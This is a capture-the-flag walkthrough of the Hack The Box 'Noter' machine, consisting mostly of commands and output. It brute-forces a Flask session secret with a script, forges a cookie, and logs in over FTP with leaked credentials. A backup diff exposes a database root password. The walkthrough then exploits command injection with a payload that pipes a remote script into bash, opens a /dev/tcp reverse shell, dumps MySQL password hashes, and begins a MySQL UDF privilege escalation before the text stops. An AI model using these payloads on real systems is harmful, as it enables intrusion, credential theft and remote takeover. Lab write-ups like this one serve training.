bruteforce.py  #!/usr/bin/env python3 ## standard imports import sys import zlib from itsdangerous import base64_decode import ast import string from abc import ABC, abstractmethod  ## Lib for argument parsing import argparse import itertools  ## external Imports from flask.sessions import SecureCookieSessionInterface  class MockApp(object):      def __init__(self, secret_key):         self.secret_key = secret_key  class FSCM(ABC):      def decode(session_cookie_value, secret_key):         \"\"\" Decode a Flask cookie  \"\"\"         try:             app = MockApp(secret_key)             si = SecureCookieSessionInterface()             s = si.get_signing_serializer(app)             print(s.loads(session_cookie_value))             exit()         except Exception as e:             return \"[Decoding error] {}\".format(e)             raise e  if __name__ == \"__main__\":     if len(sys.argv) &lt; 3:         print(\"Usage: bruteforce.py &lt;cookie&gt; &lt;wordlist&gt;\")         exit()      cookie = sys.argv[1]     wordlist = sys.argv[2]     secret_key = ''      print(f\"Bruteforcing cookie {cookie}\")     file = open(wordlist,\"r\")      for w in file:         w = w.rstrip()         print(f\"Testig secret_key {w}\")         print(FSCM.decode(cookie, w))   ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Noter/exploit] ‚îî‚îÄ$ python3 bruteforce.py \"eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU\" /usr/share/wordlists/rockyou.txt  Bruteforcing cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU Testig secret_key 123456 [Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match Testig secret_key 12345 [Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match Testig secret_key 123456789 [Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match Testig secret_key password [Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match ... [Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match Testig secret_key secret123 {'logged_in': True, 'username': 'maoutis'}   Crafting an arbitrary cookie to impersonate blue:  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/‚Ä¶/HTB/Noter/exploit/flask-session-cookie-manager] ‚îî‚îÄ$ python3 flask_session_cookie_manager3.py encode  -s 'secret123' -t \"{'logged_in': True, 'username': 'blue'}\" eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Ynz37Q.bhsuepbK0pIPjT4j091foqoNesw  New features for VIP users:    Blue notes:    Enumerate secret notes     üîë blue     blue@Noter!      Accessed FTP using leaked credentials  ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/‚Ä¶/HTB/Noter/exploit/flask-session-cookie-manager] ‚îî‚îÄ$ ftp noter.htb Connected to noter.htb. 220 (vsFTPd 3.0.3) Name (noter.htb:maoutis): blue 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files -rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf 226 Directory send OK. ftp&gt; get policy.pdf   policy.pdf            Tried to access SSH using noter credentials (not working)        ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Noter/loot]   ‚îî‚îÄ$ ssh blue@noter.htb   blue@noter.htb's password:   Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)         * Documentation:  https://help.ubuntu.com    * Management:     https://landscape.canonical.com    * Support:        https://ubuntu.com/advantage         System information disabled due to load higher than 2.0         * Super-optimized for small spaces - read how we shrank the memory      footprint of MicroK8s to make it the smallest full K8s around.           https://ubuntu.com/blog/microk8s-memory-optimisation        157 updates can be applied immediately.   112 of these updates are standard security updates.   To see these additional updates run: apt list --upgradable        The list of available updates is more than a week old.   To check for new updates run: sudo apt update        The programs included with the Ubuntu system are free software;   the exact distribution terms for each program are described in the   individual files in /usr/share/doc/*/copyright.        Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by   applicable law.        The programs included with the Ubuntu system are free software;   the exact distribution terms for each program are described in the   individual files in /usr/share/doc/*/copyright.        Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by   applicable law.        This account is currently not available.   Connection to noter.htb closed.                Tried to access FTP guessing ftp_admin credentials        ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Noter/loot]   ‚îî‚îÄ$ ftp noter.htb   Connected to noter.htb.   220 (vsFTPd 3.0.3)   Name (noter.htb:maoutis): ftp_admin   331 Please specify the password.   Password:   230 Login successful.   Remote system type is UNIX.   Using binary mode to transfer files.   ftp&gt; ls   200 PORT command successful. Consider using PASV.   150 Here comes the directory listing.   -rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip   -rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip   226 Directory send OK.   ftp&gt; get app_backup_1635803546.zip   local: app_backup_1635803546.zip remote: app_backup_1635803546.zip   200 PORT command successful. Consider using PASV.   150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).   226 Transfer complete.   25559 bytes received in 0.04 secs (667.0219 kB/s)   ftp&gt; get app_backup_1638395546.zip   local: app_backup_1638395546.zip remote: app_backup_1638395546.zip   200 PORT command successful. Consider using PASV.   150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).   226 Transfer complete.   26298 bytes received in 0.04 secs (697.8327 kB/s)                Enumerated differences between the two zip files:        ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Noter/loot]   ‚îî‚îÄ$ diff app_backup_1635803546 app_backup_1638395546 -q -r   Only in app_backup_1635803546: app_backup_1635803546.zip   Only in app_backup_1638395546: app_backup_1638395546.zip   Files app_backup_1635803546/app.py and app_backup_1638395546/app.py differ        ‚îå‚îÄ‚îÄ(maoutis„âøkali)-[~/CTF/HTB/Noter/loot]   ‚îî‚îÄ$ diff app_backup_1635803546/app.py app_backup_1638395546/app.py -y --suppress-common-lines -t                                                                                                                                         1 ‚®Ø   app.config['MYSQL_USER'] = 'root'                               |  app.config['MYSQL_USER'] = 'DB_user'   app.config['MYSQL_PASSWORD'] = 'Nildogg36'                      |  app.config['MYSQL_PASSWORD'] = 'DB_password'                                                                   &gt;  attachment_dir = 'misc/attachments/'                                                                   &gt;                                                                   &gt;                                                                   &gt;  ## Export notes                                                                   &gt;  @app.route('/export_note', methods=['GET', 'POST'])                                                                   &gt;  @is_logged_in                                                                   &gt;  def export_note():                                                                   &gt;      if check_VIP(session['username']):                                                                   &gt;          try:                                                                   &gt;              cur = mysql.connection.cursor()                                                                   &gt;                                                                   &gt;              ## Get note                                                                   &gt;              result = cur.execute(\"SELECT * FROM notes WHERE aut                                                                   &gt;                                                                   &gt;              notes = cur.fetchall()                                                                   &gt;                                                                   &gt;              if result &gt; 0:                                                                   &gt;                  return render_template('export_note.html', note                                                                   &gt;              else:                                                                   &gt;                  msg = 'No notes Found'                                                                   &gt;                  return render_template('export_note.html', msg=                                                                   &gt;              ## Close connection                                                                   &gt;              cur.close()                                                                   &gt;                                                                   &gt;          except Exception as e:                                                                   &gt;              return render_template('export_note.html', error=\"A                                                                   &gt;                                                                   &gt;      else:                                                                   &gt;          abort(403)                                                                   &gt;                                                                   &gt;  ## Export local                                                                   &gt;  @app.route('/export_note_local/&lt;string:id&gt;', methods=['GET'])                                                                   &gt;  @is_logged_in                                                                   &gt;  def export_note_local(id):                                                                   &gt;      if check_VIP(session['username']):                                                                   &gt;                                                                   &gt;          cur = mysql.connection.cursor()                                                                   &gt;                                                                   &gt;          result = cur.execute(\"SELECT * FROM notes WHERE id = %s                                                                   &gt;                                                                   &gt;          if result &gt; 0:                                                                   &gt;              note = cur.fetchone()                                                                   &gt;                                                                   &gt;              rand_int = random.randint(1,10000)                                                                   &gt;              command = f\"node misc/md-to-pdf.js  $'{note['body']                                                                   &gt;              subprocess.run(command, shell=True, executable=\"/bi                                                                   &gt;                                                                   &gt;              return send_file(attachment_dir + str(rand_int) +'.                                                                   &gt;                                                                   &gt;          else:                                                                   &gt;              return render_template('dashboard.html')                                                                   &gt;      else:                                                                   &gt;          abort(403)                                                                   &gt;                                                                   &gt;  ## Export remote                                                                   &gt;  @app.route('/export_note_remote', methods=['POST'])                                                                   &gt;  @is_logged_in                                                                   &gt;  def export_note_remote():                                                                   &gt;      if check_VIP(session['username']):                                                                   &gt;          try:                                                                   &gt;              url = request.form['url']                                                                   &gt;                                                                   &gt;              status, error = parse_url(url)                                                                   &gt;                                                                   &gt;              if (status is True) and (error is None):                                                                   &gt;                  try:                                                                   &gt;                      r = pyrequest.get(url,allow_redirects=True)                                                                   &gt;                      rand_int = random.randint(1,10000)                                                                   &gt;                      command = f\"node misc/md-to-pdf.js  $'{r.te                                                                   &gt;                      subprocess.run(command, shell=True, executa                                                                   &gt;                                                                   &gt;                      if os.path.isfile(attachment_dir + f'{str(r                                                                   &gt;                                                                   &gt;                          return send_file(attachment_dir + f'{st                                                                   &gt;                                                                   &gt;                      else:                                                                   &gt;                          return render_template('export_note.htm                                                                   &gt;                                                                   &gt;                  except Exception as e:                                                                   &gt;                      return render_template('export_note.html',                                                                   &gt;                                                                   &gt;                                                                   &gt;              else:                                                                   &gt;                  return render_template('export_note.html', erro                                                                   &gt;                                                                   &gt;          except Exception as e:                                                                   &gt;              return render_template('export_note.html', error=f\"                                                                   &gt;                                                                   &gt;      else:                                                                   &gt;          abort(403)                                                                   &gt;                                                                   &gt;  ## Import notes                                                                   &gt;  @app.route('/import_note', methods=['GET', 'POST'])                                                                   &gt;  @is_logged_in                                                                   &gt;  def import_note():                                                                   &gt;                                                                   &gt;      if check_VIP(session['username']):                                                                   &gt;          if request.method == 'GET':                                                                   &gt;              return render_template('import_note.html')                                                                   &gt;                                                                   &gt;          elif request.method == \"POST\":                                                                   &gt;              title = request.form['title']                                                                   &gt;              url = request.form['url']                                                                   &gt;                                                                   &gt;              status, error = parse_url(url)                                                                   &gt;                                                                   &gt;              if (status is True) and (error is None):                                                                   &gt;                  try:                                                                   &gt;                      r = pyrequest.get(url,allow_redirects=True)                                                                   &gt;                      md = \"\\n\\n\".join(r.text.split(\"\\n\")[:])                                                                   &gt;                                                                   &gt;                      body = markdown.markdown(md)                                                                   &gt;                      cur = mysql.connection.cursor()                                                                   &gt;                      cur.execute(\"INSERT INTO notes(title, body,                                                                   &gt;                      mysql.connection.commit()                                                                   &gt;                      cur.close()                                                                   &gt;                                                                   &gt;                      return render_template('import_note.html',                                                                   &gt;                                                                   &gt;                                                                   &gt;                  except Exception as e:                                                                   &gt;                      return render_template('import_note.html',                                                                   &gt;                                                                   &gt;              else:                                                                   &gt;                  return render_template('import_note.html', erro                                                                   &gt;                                                                   &gt;      else:                                                                   &gt;          abort(403)                                                                   &gt;                Enumerated app.py        #!/usr/bin/python3   from flask import Flask, render_template, flash, redirect, url_for, abort, session, request, logging, send_file   from flask_mysqldb import MySQL   from wtforms import Form, StringField, TextAreaField, PasswordField, validators   from passlib.hash import sha256_crypt   from functools import wraps   import time   import requests as pyrequest   from html2text import html2text   import markdown   import random, os, subprocess        app = Flask(__name__)        ## Config MySQL   app.config['MYSQL_HOST'] = 'localhost'   app.config['MYSQL_USER'] = 'DB_user'   app.config['MYSQL_PASSWORD'] = 'DB_password'   app.config['MYSQL_DB'] = 'app'   app.config['MYSQL_CURSORCLASS'] = 'DictCursor'        attachment_dir = 'misc/attachments/'        ## init MYSQL   mysql = MySQL(app)        ## Index   @app.route('/')   def index():       return render_template('home.html')        ## About   @app.route('/about')   def about():       return render_template('about.html')        ## Check if user logged in   def is_logged_in(f):       @wraps(f)       def wrap(*args, **kwargs):           if 'logged_in' in session:               return f(*args, **kwargs)           else:               flash('Unauthorized, Please login', 'danger')               return redirect(url_for('login'))       return wrap        ## notes   @app.route('/notes')   @is_logged_in   def notes():       ## Create cursor       cur = mysql.connection.cursor()       ## Get notes       if check_VIP(session['username']):           result = cur.execute(\"SELECT * FROM notes where author= (%s or 'Noter Team')\",[session['username']])       else:           result = cur.execute(\"SELECT * FROM notes where author= %s\",[session['username']])            notes = cur.fetchall()            if result &gt; 0:           return render_template('notes.html', notes=notes)       else:           msg = 'No notes Found'           return render_template('notes.html', msg=msg)       ## Close connection       cur.close()        #Single note   @app.route('/note/&lt;string:id&gt;/')   @is_logged_in   def note(id):       ## Create cursor       cur = mysql.connection.cursor()            ## Get notes       if check_VIP(session['username']):           result = cur.execute(\"SELECT * FROM notes where author= (%s or 'Noter Team') and id = %s\",(session['username'], id))       else:           result = cur.execute(\"SELECT * FROM notes where author= %s\",[session['username']])            note = cur.fetchone()       note['body'] = html2text(note['body'])       return render_template('note.html', note=note)        ## Register Form Class   class RegisterForm(Form):       name = StringField('Name', [validators.Length(min=1, max=50)])       username = StringField('Username', [validators.Length(min=3, max=25)])       email = StringField('Email', [validators.Length(min=6, max=50)])       password = PasswordField('Password', [           validators.DataRequired(),           validators.EqualTo('confirm', message='Passwords do not match')       ])       confirm = PasswordField('Confirm Password')        ## User Register   @app.route('/register', methods=['GET', 'POST'])   def register():       form = RegisterForm(request.form)       if request.method == 'POST' and form.validate():           name = form.name.data           email = form.email.data           username = form.username.data           password = sha256_crypt.encrypt(str(form.password.data))                ## Create cursor           cur = mysql.connection.cursor()                ## Execute query           cur.execute(\"INSERT INTO users(name, email, username, password) VALUES(%s, %s, %s, %s)\", (name, email, username, password))                ## Commit to DB           mysql.connection.commit()                ## Close connection           cur.close()                flash('You are now registered and can log in', 'success')                return redirect(url_for('login'))       return render_template('register.html', form=form)        ## User login   @app.route('/login', methods=['GET', 'POST'])   def login():       if request.method == 'POST':           ## Get Form Fields           username = request.form['username']           password_candidate = request.form['password']                ## Create cursor           cur = mysql.connection.cursor()                ## Get user by username           result = cur.execute(\"SELECT * FROM users WHERE username = %s\", ([username]))                if result &gt; 0:               ## Get stored hash               data = cur.fetchone()               password = data['password']                    ## Compare Passwords               if sha256_crypt.verify(password_candidate, password):                   ## Passed                   session['logged_in'] = True                   session['username'] = username                        flash('You are now logged in', 'success')                   return redirect(url_for('dashboard'))               else:                   error = 'Invalid login'                   return render_template('login.html', error=error)               ## Close connection               cur.close()           else:               error = 'Invalid credentials'               return render_template('login.html', error=error)            return render_template('login.html')        ## Logout   @app.route('/logout')   @is_logged_in   def logout():       session.clear()       flash('You are now logged out', 'success')       return redirect(url_for('login'))        #Check VIP   def check_VIP(username):       try:           cur = mysql.connection.cursor()           results = cur.execute(\"\"\" select username, case when role = \"VIP\" then True else False end as VIP from users where username = %s \"\"\", [username])                results = cur.fetchone()           cur.close()                if len(results) &gt; 0:               if results['VIP'] == 1:                   return True                return False            except Exception as e:           return render_template('login.html')        ## Dashboard   @app.route('/dashboard')   @is_logged_in   def dashboard():            ## Create cursor       cur = mysql.connection.cursor()            ## Get notes       #result = cur.execute(\"SELECT * FROM notes\")       ## Show notes only from the user logged in        result = cur.execute(\"SELECT * FROM notes WHERE author = %s\",[session['username']])            notes = cur.fetchall()       VIP = check_VIP(session['username'])            if result &gt; 0:           if VIP:               return render_template('vip_dashboard.html', notes=notes)                return render_template('dashboard.html', notes=notes)                else:           msg = 'No notes Found'                if VIP:               return render_template('vip_dashboard.html', msg=msg)                return render_template('dashboard.html', msg=msg)       ## Close connection       cur.close()        ## parse the URL   def parse_url(url):       url = url.lower()       if not url.startswith (\"http://\" or \"https://\"):           return False, \"Invalid URL\"                if not url.endswith('.md'):               return False, \"Invalid file type\"            return True, None        ## Export notes   @app.route('/export_note', methods=['GET', 'POST'])   @is_logged_in   def export_note():       if check_VIP(session['username']):           try:               cur = mysql.connection.cursor()                    ## Get note               result = cur.execute(\"SELECT * FROM notes WHERE author = %s\", ([session['username']]))                    notes = cur.fetchall()                    if result &gt; 0:                   return render_template('export_note.html', notes=notes)               else:                   msg = 'No notes Found'                   return render_template('export_note.html', msg=msg)               ## Close connection               cur.close()                                except Exception as e:               return render_template('export_note.html', error=\"An error occured!\")            else:           abort(403)        ## Export local   @app.route('/export_note_local/&lt;string:id&gt;', methods=['GET'])   @is_logged_in   def export_note_local(id):       if check_VIP(session['username']):                cur = mysql.connection.cursor()                result = cur.execute(\"SELECT * FROM notes WHERE id = %s and author = %s\", (id,session['username']))                if result &gt; 0:               note = cur.fetchone()                    rand_int = random.randint(1,10000)               command = f\"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}\"               subprocess.run(command, shell=True, executable=\"/bin/bash\")                            return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)                else:               return render_template('dashboard.html')       else:           abort(403)        ## Export remote   @app.route('/export_note_remote', methods=['POST'])   @is_logged_in   def export_note_remote():       if check_VIP(session['username']):           try:               url = request.form['url']                    status, error = parse_url(url)                    if (status is True) and (error is None):                   try:                       r = pyrequest.get(url,allow_redirects=True)                       rand_int = random.randint(1,10000)                       command = f\"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}\"                       subprocess.run(command, shell=True, executable=\"/bin/bash\")                            if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):                                return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)                            else:                           return render_template('export_note.html', error=\"Error occured while exporting the !\")                        except Exception as e:                       return render_template('export_note.html', error=\"Error occured!\")                    else:                   return render_template('export_note.html', error=f\"Error occured while exporting ! ({error})\")                            except Exception as e:               return render_template('export_note.html', error=f\"Error occured while exporting ! ({e})\")            else:           abort(403)        ## Import notes   @app.route('/import_note', methods=['GET', 'POST'])   @is_logged_in   def import_note():            if check_VIP(session['username']):           if request.method == 'GET':               return render_template('import_note.html')                elif request.method == \"POST\":               title = request.form['title']               url = request.form['url']                    status, error = parse_url(url)                    if (status is True) and (error is None):                   try:                       r = pyrequest.get(url,allow_redirects=True)                       md = \"\\n\\n\".join(r.text.split(\"\\n\")[:])                            body = markdown.markdown(md)                       cur = mysql.connection.cursor()                       cur.execute(\"INSERT INTO notes(title, body, author, create_date ) VALUES  (%s, %s, %s ,%s) \", (title, body[:900], session['username'], time.ctime()))                       mysql.connection.commit()                       cur.close()                            return render_template('import_note.html', msg=\"Note imported successfully!\")                                             except Exception as e:                       return render_template('import_note.html', error=\"An error occured when importing!\")                    else:                   return render_template('import_note.html', error=f\"An error occured when importing! ({error})\")            else:           abort(403)        ## upgrade to VIP   @app.route('/VIP',methods=['GET'])   @is_logged_in   def upgrade():       return render_template('upgrade.html')        ## note Form Class   class NoteForm(Form):       title = StringField('Title', [validators.Length(min=1, max=200)])       body = TextAreaField('Body', [validators.Length(min=30)])        ## Add note   @app.route('/add_note', methods=['GET', 'POST'])   @is_logged_in   def add_note():       form = NoteForm(request.form)       if request.method == 'POST' and form.validate():           title = form.title.data           body = form.body.data           ## Create Cursor           cur = mysql.connection.cursor()                ## Execute           cur.execute(\"INSERT INTO notes(title, body, author,create_date ) VALUES(%s, %s, %s, %s)\",(title, body, session['username'], time.ctime()))                ## Commit to DB           mysql.connection.commit()                #Close connection           cur.close()                flash('note Created', 'success')                return redirect(url_for('dashboard'))            return render_template('add_note.html', form=form)        ## Edit note   @app.route('/edit_note/&lt;int:id&gt;', methods=['GET', 'POST'])   @is_logged_in   def edit_note(id):       ## Create cursor       cur = mysql.connection.cursor()            ## Get note by id       result = cur.execute(\"SELECT * FROM notes WHERE id = %s AND author = %s\", (id, session['username']))            note = cur.fetchone()       cur.close()       ## Get form       form = NoteForm(request.form)            ## Populate note form fields       form.title.data = note['title']       form.body.data = note['body']            if request.method == 'POST' and form.validate():           title = request.form['title']           body = request.form['body']                ## Create Cursor           cur = mysql.connection.cursor()           app.logger.info(title)           ## Execute           cur.execute (\"UPDATE notes SET title=%s, body=%s WHERE id=%s  AND author = %s\",(title, body, id, session['username']))           ## Commit to DB           mysql.connection.commit()                #Close connection           cur.close()                flash('note Updated', 'success')                return redirect(url_for('dashboard'))            return render_template('edit_note.html', form=form)        ## Delete note   @app.route('/delete_note/&lt;int:id&gt;', methods=['POST'])   @is_logged_in   def delete_note(id):       ## Create cursor       cur = mysql.connection.cursor()            ## Execute       cur.execute(\"DELETE FROM notes WHERE id = %s AND author= %s\",(id, session['username']))            ## Commit to DB       mysql.connection.commit()            #Close connection       cur.close()            flash('Note deleted', 'success')            return redirect(url_for('dashboard'))        if __name__ == '__main__':       app.secret_key='secret123'       app.run(host=\"0.0.0.0\",debug=False)           Arbitrary Code Injection  app.py used user controllable input (from already created notes or through arbitrary external resources) to build a system command. It is possible to inject arbitrary code in order to affect the expected behavior of the software.  Vulnerable code:  @app.route('/export_note_local/&lt;string:id&gt;', methods=['GET']) @is_logged_in def export_note_local(id):     if check_VIP(session['username']):         cur = mysql.connection.cursor()         result = cur.execute(\"SELECT * FROM notes WHERE id = %s and author = %s\", (id,session['username']))         if result &gt; 0:             note = cur.fetchone()             rand_int = random.randint(1,10000)             command = f\"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}\"             subprocess.run(command, shell=True, executable=\"/bin/bash\")             return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)         ...  ## Export remote @app.route('/export_note_remote', methods=['POST']) @is_logged_in def export_note_remote():     if check_VIP(session['username']):         try:             url = request.form['url']             status, error = parse_url(url)             if (status is True) and (error is None):                 try:                     r = pyrequest.get(url,allow_redirects=True)                     rand_int = random.randint(1,10000)                     command = f\"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}\"                     subprocess.run(command, shell=True, executable=\"/bin/bash\")                     if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):                         return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)                    ...  exploit.md:  ';curl http://10.10.14.3/rev.sh|/bin/bash;'   rev.sh:  /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.3/10099 0&gt;&amp;1'     Privilege Escalation  Local enumeration  Enumerated local users:  svc@noter:~$ cat /etc/passwd | grep 'sh' root:x:0:0:root:/root:/bin/bash sshd:x:112:65534::/run/sshd:/usr/sbin/nologin svc:x:1001:1001:,,,:/home/svc:/bin/bash   Enumerated machine:  svc@noter:~$ cat /etc/*-release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION=\"Ubuntu 20.04.3 LTS\" NAME=\"Ubuntu\" VERSION=\"20.04.3 LTS (Focal Fossa)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 20.04.3 LTS\" VERSION_ID=\"20.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=focal UBUNTU_CODENAME=focal svc@noter:~$ cat /etc/issue Ubuntu 20.04.3 LTS \\n \\l   Enumerated running services:  svc@noter:~$ netstat -polentau Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        25450      -                    off (0.00/0/0) tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          26661      -                    off (0.00/0/0) tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1001       28777      1265/python3         off (0.00/0/0) tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      0          27890      -                    off (0.00/0/0) tcp        0      0 10.10.11.160:5000       10.10.14.3:32888        ESTABLISHED 1001       247993     1265/python3         off (0.00/0/0) tcp        0      0 127.0.0.1:58582         127.0.0.1:3306          ESTABLISHED 0          255615     -                    off (0.00/0/0) tcp        0      0 127.0.0.1:3306          127.0.0.1:58582         ESTABLISHED 0          255616     -                    keepalive (1103.05/0/0) tcp        0      1 10.10.11.160:37594      8.8.8.8:53              SYN_SENT    101        358593     -                    on (7.80/3/0) tcp        0    187 10.10.11.160:57182      10.10.14.3:10099        ESTABLISHED 1001       247702     31500/bash           on (0.24/0/0) tcp6       0      0 :::21                   :::*                    LISTEN      0          26471      -                    off (0.00/0/0) tcp6       0      0 :::22                   :::*                    LISTEN      0          26663      -                    off (0.00/0/0) udp        0      0 127.0.0.1:36551         127.0.0.53:53           ESTABLISHED 102        358592     -                    off (0.00/0/0) udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        25449      -                    off (0.00/0/0) udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          21881      -                    off (0.00/0/0)   Enumerated mysql:  svc@noter:~$ mysql -V mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2  svc@noter:~$ mysql Welcome to the MariaDB monitor.  Commands end with ; or \\g. Your MariaDB connection id is 2483 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.  MariaDB [(none)]&gt; show databases; +--------------------+ | Database           | +--------------------+ | information_schema | | test               | +--------------------+ 2 rows in set (0.002 sec)  MariaDB [(none)]&gt; use test; Database changed MariaDB [test]&gt; show tables     -&gt; ; Empty set (0.000 sec)  MariaDB [test]&gt; exit Bye  svc@noter:~$ mysql --user=\"DB_user\" --password=\"DB_password\" -A Welcome to the MariaDB monitor.  Commands end with ; or \\g. Your MariaDB connection id is 2519 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.  MariaDB [(none)]&gt; show databases; +--------------------+ | Database           | +--------------------+ | app                | | information_schema | | test               | +--------------------+ 3 rows in set (0.000 sec)  MariaDB [(none)]&gt; use app; Database changed MariaDB [app]&gt; show tables; +---------------+ | Tables_in_app | +---------------+ | notes         | | users         | +---------------+ 2 rows in set (0.001 sec)  svc@noter:~$ mysql --user=\"root\" --password=\"Nildogg36\" -A Welcome to the MariaDB monitor.  Commands end with ; or \\g. Your MariaDB connection id is 2547 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.  MariaDB [(none)]&gt; show databases; +--------------------+ | Database           | +--------------------+ | app                | | information_schema | | mysql              | | performance_schema | | test               | +--------------------+ 5 rows in set (0.000 sec)  MariaDB [mysql]&gt; select User,Password from user; +---------+-------------------------------------------+ | User    | Password                                  | +---------+-------------------------------------------+ | root    | *937440AD99CBB4A102402708AA43B689818489C8 | | root    |                                           | | root    |                                           | | root    |                                           | |         |                                           | |         |                                           | | DB_user | *52107B0F316DEF5A57F59273C66227AEA58A2671 | +---------+-------------------------------------------+ 7 rows in set (0.000 sec)   Enumerated /opt  svc@noter:~$ ls -al /opt total 12 drwxr-xr-x  2 root root 4096 May  2 23:05 . drwxr-xr-x 19 root root 4096 May  2 23:05 .. -rwxr--r--  1 root root  137 Dec 30 09:41 backup.sh  svc@noter:/opt$ cat backup.sh #!/bin/bash zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\\*  svc@noter:/opt$ ls -al /usr/bin/zip -rwxr-xr-x 1 root root 216256 Apr 21  2017 /usr/bin/zip   Enumerated PATH:  svc@noter:/opt$ echo $PATH /home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  svc@noter:/opt$ ls -ald /home/svc/.local/bin/ drwxrwxr-x 2 svc svc 4096 May  2 23:05 /home/svc/.local/bin/ svc@noter:/opt$ ls -ald /usr/local/sbin drwxr-xr-x 2 root root 4096 Aug 24  2021 /usr/local/sbin svc@noter:/opt$ ls -ald /usr/local/bin drwxr-xr-x 2 root root 4096 May  2 15:02 /usr/local/bin svc@noter:/opt$ ls -ald /sbin lrwxrwxrwx 1 root root 8 Aug 24  2021 /sbin -&gt; usr/sbin svc@noter:/opt$ ls -ald /bin lrwxrwxrwx 1 root root 7 Aug 24  2021 /bin -&gt; usr/bin svc@noter:/opt$ ls -ald /usr/sbin drwxr-xr-x 2 root root 20480 May  2 19:24 /usr/sbin svc@noter:/opt$ ls -ald /usr/bin drwxr-xr-x 2 root root 36864 May  2 22:49 /usr/bin   MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)     Offensive Security‚Äôs Exploit Database Archive   svc@noter:/dev/shm/exploit$ nano raptor_udf2.c svc@noter:/dev/shm/exploit$ gcc -g -c raptor_udf2.c svc@noter:/dev/shm/exploit$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc svc@noter:/dev/shm/exploit$ mysql --user=\"root\" --password=\"Nildogg36\" -A Welcome to the MariaDB monitor.  Commands end with ; or \\g. Your MariaDB connection id is 3445 Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04  Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.  MariaDB [(none)]&gt; use mysql; Database changed MariaDB [mysql]&gt; create table foo(line blob); Query OK, 0 rows affected (0.005 sec)  MariaDB [mysql]&gt; insert into foo values(load_file('/dev/shm/exploit/raptor_udf2.so')); Query OK, 1 row affected (0.002 sec)  